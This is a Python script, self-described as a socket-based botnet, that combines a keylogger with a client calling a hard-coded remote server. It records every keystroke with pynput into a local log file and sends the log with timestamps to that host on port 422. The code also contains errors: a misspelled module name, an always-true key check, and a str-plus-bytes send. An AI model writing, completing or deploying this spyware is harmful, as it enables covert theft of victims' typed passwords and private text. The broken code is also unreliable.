import os 
import socket
from threading import Thread
import argparse
import sys
from pynput.keyboard import Key, Listener
from datatime import datetime



parser = argparse.ArgumentParser(
    description="HiveMind, python bot net using sockets."
)

parser.add_argument("host", default= "xn--6pw65a019d.xyz", nargs="?", help="Address of the Server.")

parser.add_argument(
    "-p", "--port", default=422, help="Port the Server is running on.", type=int
)


args = parser.parse_args()


if not args.host:
    print("Host required! \n")
    parser.print_help()
    sys.exit(1)


s = socket.socket()
s.connect((args.host, args.port))


node_number = 'vers'


def listen_for_messages():
    while True:
        message = s.recv(1024).decode()
        if "!connected!" in message:
            connected_nodes = f"{node_number}: connected \n"
            s.send(connected_nodes.encode())



t = Thread(target=listen_for_messages)
t.daemon = True
t.start()


def press(key):
    wordz.append(key)
    with open("log.txt", "w") as file1:
        file1.writelines(f"\n{wordz}\n")
        
        
def release(key):
    if key == Key.space or Key.enter:
        with open("log.txt", "r") as file1:
            contents = file1.read()
            date_now = datetime.now().strftime('%H:%M:%S') 
            s.send(contents + date_now.encode())



while True:
    wordz = []
    
    
    with Listener(
            on_press=press,
            on_release=release) as listener:
        listener.join()
        
    

s.close()